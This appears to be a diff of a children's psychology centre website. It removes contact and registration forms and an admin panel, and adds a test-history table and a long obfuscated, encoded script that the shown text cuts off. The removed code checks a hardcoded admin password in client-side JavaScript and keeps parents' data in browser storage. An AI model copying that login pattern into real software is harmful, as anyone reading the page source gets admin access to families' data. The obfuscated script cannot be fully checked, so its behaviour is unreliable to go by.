-      <p>Sosial təcrid xüsusi qayğıya ehtiyacı olan uşaqların ən böyük problemlərindən biridir. Bir çox uşaq bacarıqlı olsa da, real mühitdə özünü ifadə etmək imkanı tapmır. Bizim icma əsaslı yanaşmamız məhz bu boşluğu doldurur: uşaq mərkəzin dörd divarı arasında deyil, kafedə öz sifarişini verərək, kitabxanada kitab seçərək, idman klubunda komanda yoldaşı olaraq inkişaf edir. Hər bir kiçik addım valideyn üçün böyük bir qürur anına çevrilir.</p>
-    </div>
-
-    <!-- STATİSTİKA -->
-    <div class="stats">
-      <div class="stats-grid">
-        <div class="stat-item"><div class="num">89%</div><div class="label">uşaq sosial qarşılıqlı əlaqədə irəlilədi</div></div>
-        <div class="stat-item"><div class="num">94%</div><div class="label">valideyn proqramdan tam razıdır</div></div>
-        <div class="stat-item"><div class="num">47</div><div class="label">uşaq ümumtəhsil məktəblərinə inteqrasiya olundu</div></div>
-        <div class="stat-item"><div class="num">120+</div><div class="label">ailə uzaqdan dəstək alır</div></div>
-      </div>
-    </div>
-
-    <!-- VALİDEYN RƏYİ -->
-    <div class="testimonial">
-      <i class="fa-solid fa-quote-left quote-mark"></i>
-      <p>Oğlum 7 yaşında autizmlə diaqnoz qoyulmuşdu. 3 ay ərzində kafedə özü sifariş verməyi öyrəndi. Bu, bizim üçün möcüzədir!</p>
-      <div class="author">
-        <span class="avatar">A</span>
-        <span>— <b>Aygün xanım</b>, valideyn</span>
-      </div>
-    </div>
-  </div>
-</section>
-
-<!-- ============================================================
-     PEŞƏKAR TESTLƏR
-     ============================================================ -->
-<section class="tests" id="tests">
-  <div class="container">
-    <div class="section-head">
-      <span class="eyebrow">Qiymətləndirmə</span>
-      <h2>Peşəkar testlər</h2>
-      <p>Hər uşağın inkişaf yolu fərqlidir — düzgün dəstək düzgün qiymətləndirmədən başlayır.</p>
-    </div>
-    <div class="tests-grid">
-      <div class="test-card">
-        <div class="ti"><i class="fa-solid fa-baby"></i></div>
-        <h3>Denver II</h3>
-        <p>0–6 yaş uşaqlarda inkişafın dörd əsas sahəsini erkən mərhələdə qiymətləndirir.</p>
-      </div>
-      <div class="test-card">
-        <div class="ti"><i class="fa-solid fa-brain"></i></div>
-        <h3>CBT</h3>
-        <p>Koqnitiv-davranış yanaşması ilə narahatlıq və davranış çətinliklərini hədəfləyir.</p>
-      </div>
-      <div class="test-card">
-        <div class="ti"><i class="fa-solid fa-users"></i></div>
-        <h3>SAAS</h3>
-        <p>Sosial bacarıqlar və uyğunlaşma səviyyəsini ölçərək inteqrasiya planını formalaşdırır.</p>
-      </div>
-      <div class="test-card">
-        <div class="ti"><i class="fa-solid fa-seedling"></i></div>
-        <h3>Erkən İnkişaf</h3>
-        <p>Nitq, motorika və idrak bacarıqlarındakı güclü və zəif tərəfləri aşkarlayır.</p>
-      </div>
-      <div class="test-card">
-        <div class="ti"><i class="fa-solid fa-compass"></i></div>
-        <h3>TTAP Peşə Seçimi</h3>
-        <p>Yeniyetmələrin maraq və bacarıqlarına uyğun gələcək peşə istiqamətini müəyyən edir.</p>
-      </div>
-    </div>
-    <div class="tests-cta">
-      <a href="#contact" class="btn btn-accent"><i class="fa-solid fa-circle-info"></i> Testlər haqqında ətraflı</a>
-    </div>
-  </div>
-</section>
-
-<!-- ============================================================
-     ƏLAQƏ
-     ============================================================ -->
-<section class="contact" id="contact">
-  <div class="container">
-    <div class="section-head">
-      <span class="eyebrow">Bizimlə əlaqə</span>
-      <h2>Bizə yaxınsınız</h2>
-      <p>Sualınız var? Zəng edin, yazın və ya birbaşa ünvanımıza gəlin.</p>
-    </div>
-    <div class="contact-grid">
-      <!-- Əlaqə məlumatları -->
-      <div class="contact-info">
-        <div class="info-item">
-          <span class="ic"><i class="fa-solid fa-location-dot"></i></span>
-          <div>
-            <div class="label">Ünvan</div>
-            <div class="value addr">Bakı şəhəri, Nizami rayonu,<br>Rizvan Teymurov 59</div>
-          </div>
+        <div id="dynamicQuestions"></div>
+        <button onclick="window.submitCurrentTest()" style="margin:20px 0;">💾 Nəticəni yadda saxla</button>
+        <div id="lastResultArea"></div>
+        <h3>📜 Keçmiş testlər</h3>
+        <div style="overflow-x: auto;">
+            <table id="testHistoryTable">
+                <thead><tr><th>📅 Tarix</th><th>🏆 Bal</th><th>📊 Səviyyə</th><th>⭐ Güclər</th><th>📄 HTML</th><th>📸 Şəkil</th><th>🗑️</th></tr></thead>
+                <tbody></tbody>
+            </table>
         </div>
-        <a href="tel:+994554157215" class="info-item">
-          <span class="ic"><i class="fa-solid fa-phone"></i></span>
-          <div>
-            <div class="label">Telefon (zəng üçün toxunun)</div>
-            <div class="value">+994 55 415 72 15</div>
-          </div>
-        </a>
-        <a href="https://www.instagram.com/an_psixologiyamerkezi?igsh=aTQ4NHNoMzlnc3dz" target="_blank" rel="noopener" class="info-item">
-          <span class="ic"><i class="fa-brands fa-instagram"></i></span>
-          <div>
-            <div class="label">Instagram</div>
-            <div class="value">@an_psixologiyamerkezi</div>
-          </div>
-        </a>
-        <a href="https://maps.app.goo.gl/FJL5JUdLJrCB17N26" target="_blank" rel="noopener" class="btn btn-accent maps-btn"><i class="fa-solid fa-map-location-dot"></i> Xəritədə göstər</a>
-      </div>
-
-      <!-- Birbaşa mesaj formu -->
-      <div class="form-card">
-        <h3>Birbaşa mesaj yazın</h3>
-        <p class="sub">Mesajınızı buraxın — komandamız ən qısa zamanda sizinlə əlaqə saxlayacaq.</p>
-        <form id="messageForm">
-          <div class="field">
-            <label for="m-name">Ad</label>
-            <input type="text" id="m-name" placeholder="Adınız" required>
-          </div>
-          <div class="field">
-            <label for="m-phone">Telefon</label>
-            <input type="tel" id="m-phone" placeholder="+994 ..." required>
-          </div>
-          <div class="field">
-            <label for="m-text">Mesaj</label>
-            <textarea id="m-text" placeholder="Sualınızı və ya mesajınızı yazın..." required></textarea>
-          </div>
-          <button type="submit" class="btn btn-primary"><i class="fa-solid fa-paper-plane"></i> Göndər</button>
-          <div class="form-msg" id="messageFormMsg"><i class="fa-solid fa-circle-check"></i> Mesajınız göndərildi! Tezliklə əlaqə saxlayacağıq.</div>
-        </form>
-      </div>
     </div>
-  </div>
-</section>
-
-<!-- ============================================================
-     VALİDEYN QEYDİYYATI / İLKİN MÜRACİƏT
-     ============================================================ -->
-<section class="register" id="register">
-  <div class="container">
-    <div class="section-head">
-      <span class="eyebrow">İlkin müraciət</span>
-      <h2>Pulsuz ilkin məsləhət üçün qeydiyyat</h2>
-      <p>Formu doldurun — uşağınız üçün ən uyğun proqramı birlikdə seçək.</p>
-    </div>
-    <div class="form-card">
-      <form id="registerForm">
-        <div class="register-2col">
-          <div class="field">
-            <label for="r-parent">Valideyn adı</label>
-            <input type="text" id="r-parent" placeholder="Ad, soyad" required>
-          </div>
-          <div class="field">
-            <label for="r-age">Uşağın yaşı</label>
-            <input type="number" id="r-age" min="0" max="18" placeholder="Məsələn: 6" required>
-          </div>
-        </div>
-        <div class="register-2col">
-          <div class="field">
-            <label for="r-phone">Telefon</label>
-            <input type="tel" id="r-phone" placeholder="+994 ..." required>
-          </div>
-          <div class="field">
-            <label for="r-program">Maraqlandığınız proqram</label>
-            <select id="r-program" required>
-              <option value="" disabled selected>Seçin...</option>
-              <option value="İcma proqramı">İcma proqramı</option>
-              <option value="Uzaqdan dəstək">Uzaqdan dəstək</option>
-              <option value="Hibrid">Hibrid</option>
-              <option value="Yalnız test">Yalnız test</option>
-            </select>
-          </div>
-        </div>
-        <button type="submit" class="btn btn-primary"><i class="fa-solid fa-paper-plane"></i> Müraciəti göndər</button>
-        <div class="form-msg" id="registerFormMsg"><i class="fa-solid fa-circle-check"></i> Müraciətiniz qəbul olundu! Tezliklə sizinlə əlaqə saxlayacağıq.</div>
-      </form>
-    </div>
-  </div>
-</section>
-
-<!-- ============================================================
-     ADMIN GİRİŞİ
-     ============================================================ -->
-<section class="admin-launch">
-  <div class="container">
-    <p>Mərkəz əməkdaşısınız?</p>
-    <button class="btn btn-ghost" id="adminOpenBtn"><i class="fa-solid fa-user-lock"></i> Admin girişi</button>
-  </div>
-</section>
-
-<!-- ============================================================
-     FOOTER
-     ============================================================ -->
-<footer>
-  <div class="container">
-    <div class="f-brand"><i class="fa-solid fa-heart"></i> AN Psixoloji Dəstək və Reabilitasiya Mərkəzi</div>
-    <div class="f-credit">
-      Hazırladı
-      <a href="https://www.instagram.com/s_akhundoff" target="_blank" rel="noopener"><i class="fa-brands fa-instagram"></i> s_akhundoff</a>
-    </div>
-    <div class="f-rights">By s_akhundoff · Bütün hüquqları qorunur © 2026</div>
-  </div>
-</footer>
-
-<!-- ============================================================
-     ADMIN MODAL
-     ============================================================ -->
-<div class="modal-overlay" id="adminModal">
-  <div class="modal">
-    <div class="modal-head">
-      <h3><i class="fa-solid fa-shield-halved"></i> Admin Panel</h3>
-      <button class="modal-close" id="adminCloseBtn" aria-label="Bağla">&times;</button>
-    </div>
-    <div class="modal-body">
-
-      <!-- Giriş ekranı -->
-      <div id="loginView" class="login-box">
-        <div class="field">
-          <label for="a-user">İstifadəçi adı</label>
-          <input type="text" id="a-user" placeholder="admin" autocomplete="off">
-        </div>
-        <div class="field">
-          <label for="a-pass">Şifrə</label>
-          <input type="password" id="a-pass" placeholder="••••••••">
-        </div>
-        <div class="login-error" id="loginError"><i class="fa-solid fa-triangle-exclamation"></i> İstifadəçi adı və ya şifrə yanlışdır.</div>
-        <button class="btn btn-accent" id="loginBtn"><i class="fa-solid fa-right-to-bracket"></i> Daxil ol</button>
-      </div>
-
-      <!-- Panel ekranı -->
-      <div id="panelView" style="display:none">
-        <div class="admin-tabs">
-          <button class="admin-tab active" data-tab="messages"><i class="fa-solid fa-envelope"></i> Gələn mesajlar</button>
-          <button class="admin-tab" data-tab="registrations"><i class="fa-solid fa-clipboard-list"></i> Müraciətlər</button>
-        </div>
-        <div class="tab-pane active" id="tab-messages"></div>
-        <div class="tab-pane" id="tab-registrations"></div>
-      </div>
-
-    </div>
-  </div>
+    <div class="copyright">🧸 © 2026 AN Psixoloji Dəstək və Reabilitasiya Mərkəzi | Direktor: Nahidə Axundova</div>
 </div>
 
-<script>
-/* ============================================================
-   AN MƏRKƏZİ — TƏTBİQ MƏNTİQİ
-   Bütün məlumatlar localStorage-da saxlanılır (server YOXDUR).
-   ============================================================ */
-(function(){
-  "use strict";
-
-  /* localStorage açarları */
-  var MSG_KEY = "an_messages";
-  var REG_KEY = "an_registrations";
-  var ADMIN_USER = "admin";
-  var ADMIN_PASS = "anpsix2026";
-
-  /* ---------- Köməkçi funksiyalar ---------- */
-  function load(key){
-    try { return JSON.parse(localStorage.getItem(key)) || []; }
-    catch(e){ return []; }
-  }
-  function save(key, arr){
-    localStorage.setItem(key, JSON.stringify(arr));
-  }
-  function nowStr(){
-    var d = new Date();
-    function p(n){ return n<10 ? "0"+n : n; }
-    return p(d.getDate())+"."+p(d.getMonth()+1)+"."+d.getFullYear()+" "+p(d.getHours())+":"+p(d.getMinutes());
-  }
-  /* Təhlükəsiz mətn (XSS-dən qorunma) */
-  function esc(str){
-    return String(str)
-      .replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;")
-      .replace(/"/g,"&quot;").replace(/'/g,"&#39;");
-  }
-
-  /* ---------- Birbaşa mesaj formu ---------- */
-  var messageForm = document.getElementById("messageForm");
-  messageForm.addEventListener("submit", function(e){
-    e.preventDefault();                         // səhifə yenilənməsin
-    var msgs = load(MSG_KEY);
-    msgs.unshift({
-      id: Date.now(),
-      name: document.getElementById("m-name").value.trim(),
-      phone: document.getElementById("m-phone").value.trim(),
-      text: document.getElementById("m-text").value.trim(),
-      date: nowStr(),
-      read: false,
-      reply: ""
-    });
-    save(MSG_KEY, msgs);
-    messageForm.reset();
-    var ok = document.getElementById("messageFormMsg");
-    ok.classList.add("ok");
-    setTimeout(function(){ ok.classList.remove("ok"); }, 5000);
-  });
-
-  /* ---------- Qeydiyyat formu ---------- */
-  var registerForm = document.getElementById("registerForm");
-  registerForm.addEventListener("submit", function(e){
-    e.preventDefault();
-    var regs = load(REG_KEY);
-    regs.unshift({
-      id: Date.now(),
-      parent: document.getElementById("r-parent").value.trim(),
-      age: document.getElementById("r-age").value.trim(),
-      phone: document.getElementById("r-phone").value.trim(),
-      program: document.getElementById("r-program").value,
-      date: nowStr(),
-      read: false
-    });
-    save(REG_KEY, regs);
-    registerForm.reset();
-    var ok = document.getElementById("registerFormMsg");
-    ok.classList.add("ok");
-    setTimeout(function(){ ok.classList.remove("ok"); }, 5000);
-  });
-
-  /* ============================================================
-     ADMIN PANEL
-     ============================================================ */
-  var modal = document.getElementById("adminModal");
-  var loginView = document.getElementById("loginView");
-  var panelView = document.getElementById("panelView");
-
-  function openModal(){ modal.classList.add("open"); }
-  function closeModal(){
-    modal.classList.remove("open");
-    /* hər bağlananda giriş ekranına qayıt */
-    loginView.style.display = "block";
-    panelView.style.display = "none";
-    document.getElementById("a-user").value = "";
-    document.getElementById("a-pass").value = "";
-    document.getElementById("loginError").classList.remove("show");
-  }
-
-  document.getElementById("adminOpenBtn").addEventListener("click", openModal);
-  document.getElementById("adminCloseBtn").addEventListener("click", closeModal);
-  modal.addEventListener("click", function(e){
-    if(e.target === modal) closeModal();        // fonun boşluğuna toxunduqda bağlan
-  });
-
-  /* ---------- Giriş ---------- */
-  document.getElementById("loginBtn").addEventListener("click", function(){
-    var u = document.getElementById("a-user").value.trim();
-    var p = document.getElementById("a-pass").value;
-    if(u === ADMIN_USER && p === ADMIN_PASS){
-      loginView.style.display = "none";
-      panelView.style.display = "block";
-      renderMessages();
-      renderRegistrations();
-    } else {
-      document.getElementById("loginError").classList.add("show");
-    }
-  });
-  /* Enter ilə giriş */
-  document.getElementById("a-pass").addEventListener("keydown", function(e){
-    if(e.key === "Enter") document.getElementById("loginBtn").click();
-  });
-
-  /* ---------- Tablar ---------- */
-  document.querySelectorAll(".admin-tab").forEach(function(tab){
-    tab.addEventListener("click", function(){
-      document.querySelectorAll(".admin-tab").forEach(function(t){ t.classList.remove("active"); });
-      document.querySelectorAll(".tab-pane").forEach(function(p){ p.classList.remove("active"); });
-      tab.classList.add("active");
-      document.getElementById("tab-"+tab.dataset.tab).classList.add("active");
-    });
-  });
-
-  /* ---------- Mesajların göstərilməsi ---------- */
-  function renderMessages(){
-    var pane = document.getElementById("tab-messages");
-    var msgs = load(MSG_KEY);
-    if(msgs.length === 0){
-      pane.innerHTML = '<div class="empty-state"><i class="fa-solid fa-inbox"></i>Hələ heç bir mesaj yoxdur.</div>';
-      return;
-    }
-    pane.innerHTML = msgs.map(function(m){
-      var replyHtml = m.reply
-        ? '<div class="msg-reply"><b>Cavabınız:</b>'+esc(m.reply)+'</div>'
-        : '';
-      return ''+
-      '<div class="msg-card '+(m.read?'read':'')+'">'+
-        '<div class="msg-top">'+
-          '<span class="who">'+esc(m.name)+' · <a href="tel:'+esc(m.phone)+'">'+esc(m.phone)+'</a></span>'+
-          '<span class="msg-status">'+(m.read?'oxundu':'yeni')+'</span>'+
-        '</div>'+
-        '<div class="msg-date"><i class="fa-regular fa-clock"></i> '+esc(m.date)+'</div>'+
-        '<div class="msg-text">'+esc(m.text)+'</div>'+
-        replyHtml+
-        '<div class="reply-area" id="reply-'+m.id+'">'+
-          '<textarea placeholder="Cavab yazın...">'+esc(m.reply)+'</textarea>'+
-          '<div class="msg-actions" style="margin-top:8px">'+
-            '<button class="mini-btn reply-b" data-save="'+m.id+'"><i class="fa-solid fa-check"></i> Cavabı yadda saxla</button>'+
-          '</div>'+
-        '</div>'+
-        '<div class="msg-actions">'+
-          '<button class="mini-btn read-b" data-read="'+m.id+'"><i class="fa-solid fa-eye"></i> '+(m.read?'Oxunmamış et':'Oxundu kimi qeyd et')+'</button>'+
-          '<button class="mini-btn reply-b" data-reply="'+m.id+'"><i class="fa-solid fa-reply"></i> Cavab yaz</button>'+
-          '<button class="mini-btn del-b" data-del="'+m.id+'"><i class="fa-solid fa-trash"></i> Sil</button>'+
-        '</div>'+
-      '</div>';
-    }).join("");
-  }
-
-  /* ---------- Müraciətlərin göstərilməsi ---------- */
-  function renderRegistrations(){
-    var pane = document.getElementById("tab-registrations");
-    var regs = load(REG_KEY);
-    if(regs.length === 0){
-      pane.innerHTML = '<div class="empty-state"><i class="fa-solid fa-clipboard"></i>Hələ heç bir müraciət yoxdur.</div>';
-      return;
-    }
-    pane.innerHTML = regs.map(function(r){
-      return ''+
-      '<div class="msg-card '+(r.read?'read':'')+'">'+
-        '<div class="msg-top">'+
-          '<span class="who">'+esc(r.parent)+' · <a href="tel:'+esc(r.phone)+'">'+esc(r.phone)+'</a></span>'+
-          '<span class="msg-status">'+(r.read?'baxıldı':'yeni')+'</span>'+
-        '</div>'+
-        '<div class="msg-date"><i class="fa-regular fa-clock"></i> '+esc(r.date)+'</div>'+
-        '<div class="msg-text"><b>Uşağın yaşı:</b> '+esc(r.age)+' &nbsp;|&nbsp; <b>Proqram:</b> '+esc(r.program)+'</div>'+
-        '<div class="msg-actions">'+
-          '<button class="mini-btn read-b" data-rread="'+r.id+'"><i class="fa-solid fa-eye"></i> '+(r.read?'Baxılmamış et':'Baxıldı kimi qeyd et')+'</button>'+
-          '<button class="mini-btn del-b" data-rdel="'+r.id+'"><i class="fa-solid fa-trash"></i> Sil</button>'+
-        '</div>'+
-      '</div>';
-    }).join("");
-  }
-
-  /* ---------- Panel daxili əməliyyatlar (event delegation) ---------- */
-  panelView.addEventListener("click", function(e){
-    var btn = e.target.closest("button");
-    if(!btn) return;
-    var d = btn.dataset;
-
-    /* MESAJLAR */
-    if(d.read){
-      var msgs = load(MSG_KEY);
-      msgs = msgs.map(function(m){ if(m.id == d.read) m.read = !m.read; return m; });
-      save(MSG_KEY, msgs); renderMessages();
-    }
-    else if(d.del){
-      if(confirm("Bu mesajı silmək istədiyinizə əminsiniz?")){
-        var msgs2 = load(MSG_KEY).filter(function(m){ return m.id != d.del; });
-        save(MSG_KEY, msgs2); renderMessages();
-      }
-    }
-    else if(d.reply){
-      var area = document.getElementById("reply-"+d.reply);
-      if(area) area.classList.toggle("open");
-    }
-    else if(d.save){
-      var area2 = document.getElementById("reply-"+d.save);
-      var val = area2.querySelector("textarea").value.trim();
-      var msgs3 = load(MSG_KEY).map(function(m){
-        if(m.id == d.save){ m.reply = val; m.read = true; }
-        return m;
-      });
-      save(MSG_KEY, msgs3); renderMessages();
-    }
-    /* MÜRACİƏTLƏR */
-    else if(d.rread){
-      var regs = load(REG_KEY).map(function(r){ if(r.id == d.rread) r.read = !r.read; return r; });
-      save(REG_KEY, regs); renderRegistrations();
-    }
-    else if(d.rdel){
-      if(confirm("Bu müraciəti silmək istədiyinizə əminsiniz?")){
-        var regs2 = load(REG_KEY).filter(function(r){ return r.id != d.rdel; });
-        save(REG_KEY, regs2); renderRegistrations();
-      }
-    }
-  });
-
-  /* ============================================================
-     KONTENTİN QORUNMASI (kopyalama / oğurluğa qarşı yüngül qoruma)
-     ============================================================ */
-  document.addEventListener("contextmenu", function(e){ e.preventDefault(); });
-  document.addEventListener("keydown", function(e){
-    /* F12, Ctrl+U (mənbə), Ctrl+S (yaddaş), Ctrl+Shift+I/J/C (developer) */
-    if(e.keyCode === 123) e.preventDefault();
-    if(e.ctrlKey && (e.keyCode === 85 || e.keyCode === 83)) e.preventDefault();
-    if(e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) e.preventDefault();
-  });
-
-})();
-</script>
+<script>(function(){var _byez=["0fv7+/v09Pvm5ubm5ubm5ubm++37mRhNl5YdVPvm5ubm5ubm5ubm0fv7+/u4tLWor/uInpiPkpSV6oSK","jp6Ij5KUlYj75vuA0fv7+/v7+/v7+Y+6qx5EH2qpH2ofRB9q+6i0tbr7qhJCvxJCqfuivqmytRJC+6K+","r7Kpsqn59/nq6/bq7vu/EkKq+726qLK3EkKosqH7sh5EtxJCorKp+ff5HVQeRKK6t7qpH2r7vxhnobwY","Z7X7qB9qqbq3uqIfaqn599H7+/v7+/v7+/mWGGeorxJCqrK3+7IeRLcSQqKyqfn3+ZAYbbYSQrD7sqiv","EkK2EkKisvu5uri6qR9qqfn3+ZwYbaH7sLS1r7qwrx9q+6i6o7e6oh9qqfn30fv7+/v7+/v7+Y2yoa66","t/uvuqseRB9qqR9qH0Qfavu/EkKqsqr7or6psrUSQvuivq+yqbKp+ff5iLSosrq3+6q6or+6t7qpuvuu","oh9ErrX7sxJCqRJCsBJCr/u+v7Kp+ff5jxJCt7K2uq+3uqkfavu5sqn7vxJCvRJCvxJCtfuotLWpuvu5","uh5Euvu/GGceRBhnqfnR+/v7+4bg0fv7+/u4tLWor/uInpiPkpSV6YSKjp6Ij5KUlYj75vuA0fv7+/v7","+/v7+Z62tKiyorq3uqkfarUfavuyvbq/EkL7vr+yqfn3+Yqprqu/uvsYZ7WosqKiEkKv+6quqa6p+ff5","HVS2EkKwv7oeRLcfaqr7vr+yqfn3+YMSQq+6qB9qtR9q+76vsqm6vfu+v7Kp+ffR+/v7+/v7+/v5irqi","v7q3uqm6+66iH0Sutbe6HkQfaqn59/mcGG2htxJCthJCorL7ubq4uqkfaqn59/mCvrWy+x5EvqK3EkKp","EkL7rqIfRK61t7oeRB9qqfn3+ZYSQqiut7KiohJCr/uzsqiosvu/uh5EH2qiH2qp+ffR+/v7+/v7+/v5","n7KqqhJCr7K1svu4EkK2txJCorKp+ff5iK+pvqio+7q3rx9qtb+6+7IeRLcSQqKyqfn3+Y8SQrWqsr+y","+6oSQrmut/u+v7Kp+ff5GE2h+7UYba25EkKosrWy+7wYbaG3EkKisqn59/metqu6r7Kiuvu8GG2orxJC","qbKp+dH7+/v7huDR+/v7+7i0taiv+4iemI+SlJXohIqOnoiPkpSViPvm+4DR+/v7+/v7+/v5jxJCHkQS","Qrm5GGeosLqptx9qqvu8GG2orxJCqbKp+ff5gbq2urUfavuyv7qpEkL7vr+yqfn3+Y8SQrO3GGewEkKo","sqG3srD7qrqiv7q3uqkfarW6+6myuqISQq/7vr+yqfn30fv7+/v7+/v7+YuptLm3vrb7sxJCt7f7vr+y","qfn3+Za0r7Sp+7m6uLqpH2qqt7qpH2r59/mCur+/uh5E+ff5iLqitrr7rRJC+6K6oba6+ff5GE2h+6oS","Qqm6qR9qtR9q+62+qbKp+ffR+/v7+/v7+/v5iBJCs623EkKpvxJCtfsYbaKpEkK1sqn59/kfax5E+76v","srC6qB9q+dH7+/v7huDR+/v7+7i0taiv+4iemI+SlJXvhIqOnoiPkpSViPvm+4DR+/v7+/v7+/v5HkUS","QqOosvu8sryyor61uvvzv7IeRPf7EkK38vn3+Yu6t6+6qR9qtR9q+7YYZ6ivEkKqsrf7vL6isrWyqfn3","+Yq6HkQfaqr0GHwSQrW8EkK3+7Kor7K9ur8SQvu+v7Kp+ffR+/v7+/v7+/v5j666t76v+76zr7Kiurgf","arUfavuvEkKw+6q6qR5EH2q3uqIfaqn59/kdVK+pur0farUfavu1sqG6trcfavuouqO3uqIfaqn59/mI","ur8SQvuivrYSQrD7s7qhH2qpt7qiH2qp+ffR+/v7+/v7+/v5i663rrX7vxJCohJCqbK1svuvurUfaqIf","aqn59/mPEkK4srey+6K6qb8farb7GHy6H0Qfaqm2uh9EH2r7ubK3sqn59/matx9qHkT2rb6psh5EvxJC","+7UYba25EkL7vBhtobcSQqKyqfnR+/v7+4bg0fv7+/u4tLWor/uInpiPkpSV7oSKjp6Ij5KUlYj75vuA","0fv7+/v7+/v7+YgSQqi3EkKpEkL7sxJCv7+ytb8SQrX7uqmvH2qq+6m+urCosqK6+62+qbayqfn3+R9r","HkQfaqr3+6+0o661trr3+7+6v7r7tbSptrq3+6m+urCosqK6+ff5ihJCtxJCtvuvrq+2uvu5uri6qR9q","H0Qfavn30fv7+/v7+/v7+Yq6ohh8H2r7srcSQvuwEkKothJC9/uiuqsfah5Evx9qqba6+7m6uLqpH2qp","+ff5n761vL77rRJC+6+6qbqhtx9qqvurqbS5t762svu2srWytrq3+ff5H2u/trq1vxJC+7C0tKm/srW6","qLKiuvuiuqMeRB9qvx9qqfnR+/v7+4bg0fv7+/u4tLWor/uInpiPkpSV7YSKjp6Ij5KUlYj75vuA0fv7","+/v7+/v7+YgYbaG3EkKpsvu/GGehvBhntfuvEkK3EkK9vRhnofu+v7Kp+ff5iLq/EkL7uBhntrcSQrcS","Qqn7qq6puvu5sreyqfn3+Y8SQreytrqvt7qpH2r7qBhtobcSQvu5uh5Euvu/GGceRBhnqfn30fv7+/v7","+/v7+RhNofuyqK8SQrC3EkKpsrWy+6gYbaG3EkL7sr26vxJC+76/sqn59/mfurUfah5EH2qqv7r7qBJC","qPujEkKvure6qR9q+/OwEkKwEkK3EkK2EkLy+6K0o7+uqfn3+ZO+sLqiEkK1svu6qb8fargfarf7v7q1","H2oeRLr7ubK3sqn599H7+/v7+/v7+/mIrrq3H2r7uboeRLr7vxhnHkQYZ7n7uLqturm3urW/H2qpH2qp","+ff5lKOutrofRLr7s7qhH2qptx9qqvvzsxJCqb23EkKpsvuvurUfaqIfaqny+ff5mr8farUfavuotKK6","vx9qtR9q+6gYbaK3EkKiEkL7ubK3sqn59/mPvre+vbS1t7r7qh9qqLr7v7q1H2oeRB9qH0Qfavu5uri6","qR9qqfnR+/v7+4bg0dH7+/v7uLS1qK/7mpeXhIiemI+SlJWI++b7gNH7+/v7+/v7+6D7tbq2vuH7+StE","SE37HVSouqj7H2seRPuZuri6qR9qqre6qR9q+ff7qq6+qK+ytLWo4fuInpiPkpSV6oSKjp6Ij5KUlYj3","+7a6o4i4tKm+4fuInpiPkpSV6oSKjp6Ij5KUlYj1t761vK+z8en7pvfR+/v7+/v7+/ug+7W6tr7h+/kr","REl3+4uosqO0qLSosrq3+5YYZx5EurOyvxJC+ff7qq6+qK+ytLWo4fuInpiPkpSV6YSKjp6Ij5KUlYj3","+7a6o4i4tKm+4fuInpiPkpSV6YSKjp6Ij5KUlYj1t761vK+z8en7pvfR+/v7+/v7+/ug+7W6tr7h+/kr","RHx7+x9rtbCyHkS6vfutEkL7n7qtqbq1H2oeRPn3+6quvqivsrS1qOH7iJ6Yj5KUleiEio6eiI+SlJWI","9/u2uqOIuLSpvuH7iJ6Yj5KUleiEio6eiI+SlJWI9be+tbyvs/Hp+6b30fv7+/v7+/v7oPu1ura+4fv5","K0RUe/ucGGe1vxJCt7Kw+5MSQqK6r/v9+xhNofuKrre3rqr59/uqrr6or7K0tajh+4iemI+SlJXvhIqO","noiPkpSViPf7trqjiLi0qb7h+4iemI+SlJXvhIqOnoiPkpSViPW3vrW8r7Px6fum99H7+/v7+/v7+6D7","tbq2vuH7+StETUs0Y1T7iL61qLSp9pa0r7Sp+x9rta++qqm6qLKiuvn3+6quvqivsrS1qOH7iJ6Yj5KU","le6Eio6eiI+SlJWI9/u2uqOIuLSpvuH7iJ6Yj5KUle6Eio6eiI+SlJWI9be+tbyvs/Hp+6b30fv7+/v7","+/v7oPu1ura+4fv5K0RMeDRjVPuXtKq0q76/srD785Wyr6r7/fsYR7WosqKiEkKv8vn3+6quvqivsrS1","qOH7iJ6Yj5KUle2Eio6eiI+SlJWI9/u2uqOIuLSpvuH7iJ6Yj5KUle2Eio6eiI+SlJWI9be+tbyvs/Hp","+6bR+/v7+4bg0dH7+/v79PT7kBhtthJCsBh8svu9rrWwqLKiutH7+/v7va61uK+ytLX7r7SauK+ytLWd","tKm286++o6/y+6DR+/v7+/v7+/u3vq/7r/vm+6++o6/1r6mytvPy4NH7+/v7+/v7+7K9+/Ov9be+tbyv","s/vn++jy+6m+r66ptfuv4NH7+/v7+/v7+7e+r/uotLW3rqq3uqn75vuA+bKp+ff7+an59/v5rqn59/v5","GGep+ff7+bqp+ff7+RJCqfmG4NH7+/v7+/v7+720qfvzt76v+6j7tL37qLS1t66qt7qp8vug0fv7+/v7","+/v7+/v7+7K9+/Ov9b61v6iMsq+z86jy8vug0fv7+/v7+/v7+/v7+/v7+/u3vq/7qbS0r/vm+6/1qLey","uL7z6/f79qj1t761vK+z8uDR+/v7+/v7+/v7+/v7+/v7+7K9+/OptLSv9be+tbyvs/vl++vy+6DR+/v7","+/v7+/v7+/v7+/v7+/v7+/u3vq/7t7qor420rL63++b7qbS0r/Wot7K4vvP26vLg0fv7+/v7+/v7+/v7","+/v7+/v7+/v7sr378/m6H2q0rvn1srW4t66/vqjzt7qor420rL638vL7qb6vrqm1+6m0tK/78Pv5trr5","4NH7+/v7+/v7+/v7+/v7+/v7+/v7+763qL77qb6vrqm1+6m0tK/78Pv5thJC+eDR+/v7+/v7+/v7+/v7","+/v7+6bR+/v7+/v7+/v7+/v7ptH7+/v7+/v7+6bR+/v7+/v7+/uyvfvzr/W+tb+ojLKvs/P5H2qp+fL7","p6f7r/W+tb+ojLKvs/P5sqn58vunp/uv9b61v6iMsq+z8/muqfny+6en+6/1vrW/qIyyr7Pz+Rhnqfny","8vug0fv7+/v7+/v7+/v7+7e+r/uptLSv++b7r/Wot7K4vvPr9/v26fLg0fv7+/v7+/v7+/v7+7K9+/P5","uh9qtK759bK1uLeuv76o86m0tK/1qLeyuL7z9ury8vL7qb6vrqm1+6m0tK/78Pv5trr54NH7+/v7+/v7","+/v7+/u+t6i++6m+r66ptfuptLSv+/D7+bYSQvng0fv7+/v7+/v7ptH7+/v7+/v7+7K9+/Ov9b61v6iM","sq+z8/misqn58vL7oNH7+/v7+/v7+/v7+/u3vq/7qbS0r/vm+6/1qLeyuL7z6/f79ujy4NH7+/v7+/v7","+/v7+/upvq+uqbX7qbS0r/vw+/m2EkL54NH7+/v7+/v7+6bR+/v7+/v7+/upvq+uqbX7r/vw+/m2EkL5","4NH7+/v7ptHR+/v7+/T0+4u+HkQSQvuw